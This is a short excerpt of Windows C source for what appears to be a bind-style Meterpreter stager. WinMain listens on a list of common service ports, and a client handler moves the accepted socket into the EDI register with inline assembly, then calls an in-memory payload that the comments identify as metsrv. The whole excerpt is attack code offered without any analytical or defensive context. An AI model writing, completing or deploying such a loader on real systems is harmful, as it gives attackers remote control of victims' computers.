...
int CALLBACK WinMain(_In_  HINSTANCE hInstance, _In_  HINSTANCE hPrevInstance, _In_  LPSTR lpCmdLine, _In_  int nCmdShow){
	...
	SOCKET AcceptSocket;
	DWORD  threadid;
	int ports[] = { 10000, 3389, 53, 88, 389, 80, 443, 21, 22, 23, 3306, 8080, 8443, 137, 138, 139, 445 };
	int i = 0;
...
DWORD WINAPI handleclient(LPVOID clientsocket){
	...
	/*
		The new meterpreter expects the socket to be in EDI
		We just clobber edi
	*/
	__asm{
		mov edi, clientsocket
	}

	/*just a pointer to a function without arguments to call the in memory metsrv*/
	int(*ret)() = (int(*)())payload;
	/*the actual call to metsrv*/
	ret();
